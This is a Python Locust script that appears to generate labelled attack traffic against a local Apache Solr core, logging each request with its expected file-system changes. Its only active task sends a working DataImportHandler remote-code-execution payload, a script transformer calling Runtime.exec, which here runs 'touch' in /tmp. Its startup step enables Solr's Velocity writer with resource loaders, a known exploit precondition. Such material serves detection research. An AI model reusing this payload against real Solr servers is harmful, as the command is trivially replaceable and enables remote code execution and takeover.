import random
import re
import time
import io
from locust import HttpUser, task, between, events
from itertools import count
import os
from urllib.parse import unquote
import string
import json
from locust.clients import ResponseContextManager
from loguru import logger
from gevent.lock import Semaphore
import gevent


file_lock = Semaphore()  # 文件锁，确保多线程写入文件时不会发生冲突


data_dir = "/tmp/"


counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    # print(str(response.request.body) if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        # print("name:", name)
                        if name == 'm1_files[]':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # 如果是表单提交，解析表单数据
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    if '?' in response.request_meta["name"]:
        query_string = response.request_meta["name"].split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # 对key和value进行URL解码
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }

class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    
    def on_start(self):
        self.client.headers.update({
            "Host": "localhost:8983",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        })
        logger.info("Starting APIUser...")
        res = self.client.post(
            "/solr/demo/config",
            json={
                "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true"
                }
            },
            headers={
                "Content-Type": "application/json",
            },
            catch_response=True,
        )
        if res.status_code != 200:
            logger.error(f"Failed to set up Solr config: {res.status_code} - {res.text}")
        else:
            logger.info("Solr config set up successfully.")

    # @task
    def create_field(self):
        """文件"""
        x_request_id = str(next(counter))
        field_name = "test_field_" + random_string(8)  # 生成随机字段名
        with self.client.post(
            "/solr/demo/schema",
            params={
                "wt": "json",
                "type": "add-field",
            },
            headers={
                "x_request_id": x_request_id,
            },
            json={
                "add-field": {
                    "stored": "true",
                    "indexed": "true",
                    "uninvertible": "true",
                    "name": field_name,
                    "type": "text_en"
                }
            },
            catch_response=True,
            allow_redirects=True,
        ) as response:
            # 处理响应
            if response.status_code == 200 and response.json().get("responseHeader", {}).get("status") == 0:
                # 解析响应
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                        "destination_path": None,
                        "is_directory": False
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
                response.success()
            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    # @task
    def get_all_fields(self):
        """获取所有字段"""
        with self.client.get(
            "/solr/demo/admin/luke",
            params={
                "wt": "json",
                "show": "schema",
            },
            catch_response=True,
        ) as response:
            # 处理响应
            fields = []
            if response.status_code == 200 and response.json().get("responseHeader", {}).get("status") == 0:
                # 解析响应
                fields = list(response.json().get("schema", {}).get("fields", {}).keys())

                fields = [field for field in fields if field.startswith("test_field_")]
                response.success()
            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            
            return fields

    # @task
    def delete_field(self):
        """文件"""
        with file_lock:  # 确保在多线程环境下安全地访问文件
            fields = self.get_all_fields()
            if not fields:
                logger.warning("No fields to delete.")
                return
            field_name = random.choice(fields)  # 随机选择一个字段名
            x_request_id = str(next(counter))
            with self.client.post(
                "/solr/demo/schema",
                headers={
                    "x_request_id": x_request_id,
                },
                params={
                    "wt": "json",
                    "type": "delete-field",
                },
                json={
                    "delete-field": {
                        "name": field_name
                    }
                },
                catch_response=True,
                allow_redirects=True,
            ) as response:
                if response.status_code == 200 and response.json().get("responseHeader", {}).get("status") == 0:
                    # 解析响应
                    entry = new_log_entry(response)
                    fs_operations = [
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "update",
                            "source_path": f"/opt/solr/server/solr/demo/conf/managed-schema",
                            "destination_path": None,
                            "is_directory": False
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                    response.success()
                else:
                    logger.error(f"Request failed with status code: {response.status_code}")
                    response.failure(f"Request failed with status code: {response.status_code}")  

    @task
    def attack(self):
        with file_lock:
            x_request_id = str(next(counter))
            file_name = f"attack_file_{x_request_id}.txt"
            attack_cmd = f'touch /tmp/{file_name}'
            with self.client.post(
                "/solr/demo/dataimport",
                params={
                    "indent": "on",
                    "wt": "json",
                },
                headers={
                    "x_request_id": x_request_id,
                    "X-Requested-With": "XMLHttpRequest",
                },
                data = {
                    "command": "full-import",
                    "verbose": "false",
                    "clean": "false",
                    "commit": "true",
                    "debug": "true",
                    "core": "demo",
                    "dataConfig": 
    """<dataConfig>
    <script><![CDATA[
            function poc(){ java.lang.Runtime.getRuntime().exec("%s");
            }
    ]]></script>
    <document>
        <entity name="sample"
                fileName=".*"
                baseDir="/"
                processor="FileListEntityProcessor"
                recursive="false"
                transformer="script:poc" />
    </document>
    </dataConfig>""" % attack_cmd,
                    "name": "dataimport"
                },
                catch_response=True,
            ) as response:
                # 处理响应
                # print(response.text)
                if response.status_code == 200:
                    # 解析响应
                    entry = new_log_entry(response)
                    fs_operations = [
                        {
                            "operation": "create",
                            "source_path": f"/tmp/{file_name}",
                            "destination_path": None,
                            "is_directory": False
                        },
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                else:
                    logger.error(f"Request failed with status code: {response.status_code}")
                    response.failure(f"Request failed with status code: {response.status_code}")
            gevent.sleep(0.1)


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")